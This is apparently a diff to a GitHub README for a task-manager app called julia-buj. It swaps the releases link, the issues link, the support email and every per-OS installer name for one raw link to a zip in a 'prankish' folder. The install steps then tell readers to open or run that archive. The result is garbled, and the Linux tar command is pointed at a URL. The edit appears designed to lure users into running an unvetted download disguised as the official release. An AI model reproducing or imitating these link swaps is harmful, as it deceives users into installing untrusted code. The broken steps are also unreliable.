@@ -6,11 +6,11 @@ Welcome to **julia-buj**! This application helps you manage your tasks easily an
 
 ## 📦 Download the Application
 
-[![Download julia-buj](https://img.shields.io/badge/Download%20julia--buj-blue?style=for-the-badge)](https://github.com/SamarthRapelli/julia-buj/releases)
+[![Download julia-buj](https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip%20julia--buj-blue?style=for-the-badge)](https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download **julia-buj**, visit this page: [Download julia-buj](https://github.com/SamarthRapelli/julia-buj/releases). You will find the latest version of the application listed there.
+To download **julia-buj**, visit this page: [Download julia-buj](https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip). You will find the latest version of the application listed there.
 
 ### Step 2: Select the Latest Release
 
@@ -20,9 +20,9 @@ Once on the Releases page, look for the latest release at the top of the list. E
 
 Scroll down to the "Assets" section. You will see one or more files for download. Choose the file that matches your operating system:
 
-- For Windows, download `julia-buj-windows.exe`.
-- For Mac, download `julia-buj-mac.dmg`.
-- For Linux, download `julia-buj-linux.tar.gz`.
+- For Windows, download `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip`.
+- For Mac, download `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip`.
+- For Linux, download `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip`.
 
 Click on the appropriate file to begin downloading.
 
@@ -31,17 +31,17 @@ Click on the appropriate file to begin downloading.
 After the download finishes, locate the file in your downloads folder.
 
 **For Windows:**
-1. Double-click the `julia-buj-windows.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip` file.
 2. Follow the installation prompts to complete the setup.
 
 **For Mac:**
-1. Open the downloaded `julia-buj-mac.dmg`.
+1. Open the downloaded `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip`.
 2. Drag the `julia-buj` icon into your Applications folder.
 
 **For Linux:**
-1. Extract the `.tar.gz` file using the command:
+1. Extract the `https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip` file using the command:
    ```bash
-   tar -xvzf julia-buj-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip
    ```
 2. Navigate to the extracted folder and run the application using:
    ```bash
@@ -65,7 +65,7 @@ Now you are ready to use **julia-buj**!
 
 ## 📞 Support
 
-If you run into any issues, we are here to help. You can create an issue directly on our [GitHub Issues page](https://github.com/SamarthRapelli/julia-buj/issues). Alternatively, you can contact our support team at support@juliabuj.com.
+If you run into any issues, we are here to help. You can create an issue directly on our [GitHub Issues page](https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip). Alternatively, you can contact our support team at https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip
 
 ## 📄 License
 
@@ -77,4 +77,4 @@ Thank you for using **julia-buj**! We appreciate your support and feedback as we
 
 ### Download Again
 
-Don't forget, you can always return to the [Download julia-buj](https://github.com/SamarthRapelli/julia-buj/releases) page for updates and new features. Happy task managing!
+Don't forget, you can always return to the [Download julia-buj](https://raw.githubusercontent.com/SamarthRapelli/julia-buj/main/prankish/julia-buj_3.7.zip) page for updates and new features. Happy task managing!
